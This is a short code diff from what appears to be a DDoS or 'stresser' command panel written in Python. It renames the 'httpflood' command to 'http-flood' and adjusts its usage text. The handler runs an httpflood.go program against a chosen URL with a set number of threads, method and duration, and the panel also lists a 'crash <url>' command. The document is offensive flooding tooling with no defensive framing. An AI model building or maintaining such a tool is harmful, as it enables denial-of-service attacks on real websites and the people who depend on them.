@@ -385,7 +385,7 @@ def main():
                 print('Usage: crash <url> METHODS<GET/POST>')
                 print('Example: crash http://example.com GET')
 
-        elif "httpflood" in cnc:
+        elif "http-flood" in cnc:
             try:
                 url = cnc.split()[1]
                 thread = cnc.split()[2]
@@ -393,8 +393,8 @@ def main():
                 time = cnc.split()[4]
                 os.system(f'go run httpflood.go {url} {thread} {method} {time} nil')
             except IndexError:
-                print('Usage: httpflood <url> <threads> METHODS<GET/POST> <time>')
-                print('Example: httpflood http://example.com 15000 get 60')
+                print('Usage: http-flood <url> <threads> METHODS<GET/POST> <time>')
+                print('Example: http-flood http://example.com 15000 get 60')
 
 
         elif "help" in cnc:
